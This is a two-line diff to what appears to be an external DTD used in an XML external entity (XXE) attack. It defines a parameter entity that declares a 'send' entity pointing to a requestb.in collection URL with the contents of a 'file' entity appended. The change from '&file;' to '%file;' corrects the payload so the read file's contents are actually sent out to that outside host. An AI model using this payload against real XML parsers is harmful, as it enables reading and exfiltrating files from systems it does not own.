@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://requestb.in/1h73dgm1?p=&file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://requestb.in/1h73dgm1?p=%file;'>">
   %all;
